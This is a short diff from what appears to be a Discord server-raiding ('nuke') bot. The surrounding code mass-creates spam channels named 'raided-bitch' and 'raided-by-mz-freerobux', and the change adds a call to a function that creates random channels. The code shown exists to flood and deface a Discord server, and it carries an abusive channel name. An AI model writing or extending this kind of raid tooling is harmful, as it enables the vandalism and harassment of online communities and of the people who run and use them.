@@ -203,7 +203,8 @@ async def nuke_server_fr(ctx):
                 guild = txt2.message.guild
                 for i in range(69):
                     guild.create_text_channel(name='raided-bitch')
-
+        await create_random_channels()
+        
         guild = ctx.message.guild
         newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
 
